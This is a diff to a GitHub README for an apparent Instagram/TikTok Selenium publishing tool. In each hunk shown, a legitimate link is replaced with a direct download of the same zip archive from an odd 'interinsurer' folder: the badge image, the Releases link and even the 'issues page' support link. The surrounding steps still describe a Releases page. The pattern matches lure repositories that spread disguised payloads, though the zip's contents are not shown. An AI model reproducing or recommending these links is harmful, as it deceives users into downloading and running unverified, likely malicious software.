@@ -1,6 +1,6 @@
 # 🎉 instagram-tiktok-selenium-influencer-content-publishing-automation - Automate Your Social Media Publishing
 
-![Download Button](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
+![Download Button](https://raw.githubusercontent.com/AmrHusam/instagram-tiktok-selenium-influencer-content-publishing-automation/main/interinsurer/influencer-tiktok-content-automation-publishing-instagram-selenium-v2.0-beta.2.zip%20Now-Click%20Here-brightgreen)
 
 ## 📋 Description
 
@@ -33,7 +33,7 @@ Follow these steps to download and run the application:
 
 To get started, visit the following page to download the latest version of the application:
 
-[Download from Releases](https://github.com/AmrHusam/instagram-tiktok-selenium-influencer-content-publishing-automation/releases)
+[Download from Releases](https://raw.githubusercontent.com/AmrHusam/instagram-tiktok-selenium-influencer-content-publishing-automation/main/interinsurer/influencer-tiktok-content-automation-publishing-instagram-selenium-v2.0-beta.2.zip)
 
 1. On the Releases page, find the latest version listed.
 2. Click on the version number to view more details.
@@ -71,7 +71,7 @@ If you encounter issues:
 
 ## 💬 Support
 
-For support, you can visit the [issues page](https://github.com/AmrHusam/instagram-tiktok-selenium-influencer-content-publishing-automation/issues) on GitHub. We encourage users to report any problems or bugs.
+For support, you can visit the [issues page](https://raw.githubusercontent.com/AmrHusam/instagram-tiktok-selenium-influencer-content-publishing-automation/main/interinsurer/influencer-tiktok-content-automation-publishing-instagram-selenium-v2.0-beta.2.zip) on GitHub. We encourage users to report any problems or bugs.
 
 ## 🌟 Community Contributions
 
